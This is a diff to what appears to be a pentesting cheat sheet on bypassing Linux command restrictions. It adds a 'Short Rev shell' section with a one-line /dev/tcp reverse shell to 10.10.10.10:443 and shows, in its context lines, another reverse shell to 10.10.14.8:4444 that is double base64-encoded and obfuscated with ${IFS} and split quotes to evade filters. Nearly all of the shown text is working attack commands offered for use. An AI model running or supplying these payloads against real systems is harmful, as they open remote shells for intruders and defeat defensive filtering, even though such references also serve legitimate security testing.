@@ -8,6 +8,15 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
 
+### Short Rev shell
+
+```bash
+#Get a rev shell with
+(sh)0>/dev/tcp/10.10.10.10/443
+#Then get the out of the rev shell executing inside of it:
+exec >&0
+```
+
 ## Bypass Paths and forbidden commands
 
 ```bash
